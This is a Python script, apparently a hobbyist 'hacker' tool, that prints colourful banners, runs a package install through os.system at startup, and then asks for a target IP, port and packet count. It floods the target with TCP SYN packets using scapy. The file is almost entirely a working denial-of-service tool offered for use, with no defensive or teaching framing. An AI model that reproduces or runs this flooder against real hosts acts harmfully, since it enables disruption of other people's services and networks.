from scapy.all import IP, TCP, send
import time 
import  sys
import os
# --- Color Definitions ---
# Standard Colors
BLACK   = '\033[30m'
RED     = '\033[31m'
GREEN   = '\033[32m'
YELLOW  = '\033[33m'
BLUE    = '\033[34m'
MAGENTA = '\033[35m'
CYAN    = '\033[36m'
WHITE   = '\033[37m'

# High-Intensity (Bright) Colors
B_RED     = '\033[91m'
B_GREEN   = '\033[92m'
B_YELLOW  = '\033[93m'
B_BLUE    = '\033[94m'
B_MAGENTA = '\033[95m'
B_CYAN    = '\033[96m'
B_WHITE   = '\033[97m'

# Formatting Styles
BOLD      = '\033[1m'
UNDERLINE = '\033[4m'
DIM       = '\033[2m'
ITALIC    = '\033[3m' # Support varies by terminal

# Reset (Crucial for cleaning up)
RESET     = '\033[0m'

# --- Usage Examples ---
print(f"{B_CYAN}{BOLD}--- HELLO THERE FELLOW HACKER ---{RESET}")
time.sleep(2)
print(f"{B_GREEN}[+]NEXO TECHNOLOGY INITIATED {RESET}")
time.sleep(1)
print(f"{B_RED}....ALL PYHON VERSION WILL BE INSTALLED SHORTLY {RESET}")

# This will try to install python (requires root or proper permissions)
os.system("pkg install python -y")
print(f"{B_RED}[-] PLS RUN pip install scapy {RESET}")
# flyer to show the creator and company
print(f"{B_CYAN}{BOLD}========================================={RESET}")
print(f"{UNDERLINE}{GREEN} CREATED BY: NEXO TECH 👾👾 {RESET}")
print(f"{UNDERLINE}{WHITE} INSPIRED BY DEMON ALEX && BLUEY {RESET}")
print(f"{B_CYAN}{BOLD}========================================={RESET}")
time.sleep(1)


# ip flooder code 
# Colors
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
R = '\033[91m'
W = '\033[0m'

def start_flood():
    print(f"{C}--- SYN Flood Configurator ---{W}")
    
    # Storing in temp variables
    temp_ip = input(f"{Y}Target IP: {W}").strip()
    try:
        temp_port = int(input(f"{Y}Target Port: {W}"))
        temp_pkt  = int(input(f"{Y}Packet Count: {W}"))
    except ValueError:
        print(f"{R}[!] Error: Port and Count must be numbers.{W}")
        return

    # Visual delays (Bash-style)
    print(f"\n{C}[*] Crafting packets...{W}")
    time.sleep(1.5)
    
    # Packet Crafting
    packet = IP(dst=temp_ip) / TCP(dport=temp_port, flags="S")

    print(f"{G}[+] Sending {temp_pkt} SYN packets to {temp_ip}:{temp_port}...{W}")
    time.sleep(1)

    # Sending
    try:
        send(packet, count=temp_pkt, verbose=0)
        print(f"\n{G}[SUCCESS] Operation finished.{W}")
    except PermissionError:
        print(f"\n{R}[ERROR] Permission Denied! Run as Administrator/Sudo.{W}")

if __name__ == "__main__":
    start_flood()

